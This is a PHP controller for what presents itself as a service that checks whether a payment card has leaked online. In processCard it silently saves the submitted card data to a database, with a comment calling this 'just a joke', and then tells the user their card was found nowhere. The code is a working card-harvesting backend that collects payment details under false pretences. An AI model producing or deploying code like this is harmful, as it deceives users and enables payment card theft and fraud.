<?php

namespace App\Controller;

use App\Database\Database;
use App\Repository\CardRepository;
use App\Utils\CardValidator;

class CardController
{
    private CardRepository $cardRepository;


    public function __construct()
    {
        $db = new Database()->getConnection();
        $this->cardRepository = new CardRepository($db);
    }

    public function checkCard()
    {
        header("Content-type: application/json");

        $cardData = $this->getRequestData();

        if (!$cardData) {
            $this->sendResponse("Json inválido.", true);
        }

        if (!CardValidator::isValidCard($cardData)) {
            $this->sendResponse("Dados do cartão inválidos.", true);
        }

        $this->processCard($cardData);

    }

    // Get JSON data from request body
    private function getRequestData(): ?array
    {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);
        return json_last_error() === JSON_ERROR_NONE ? $data : null;
    }

    private function sendResponse(string $message, bool $error): void
    {
        echo json_encode(['error' => $error, 'message' => $message], JSON_THROW_ON_ERROR);
    }

    private function processCard(array $cardData)
    {
        try {
            //save card data to database just a joke :D
            $this->cardRepository->saveCard($cardData);
            $this->sendResponse("Seu cartão não foi encontrado em nenhum registro na web.", true);
        } catch (\Exception $e) {
            $this->sendResponse("Ocorreu um error ao verificar o cartão.", true);
        }
    }
}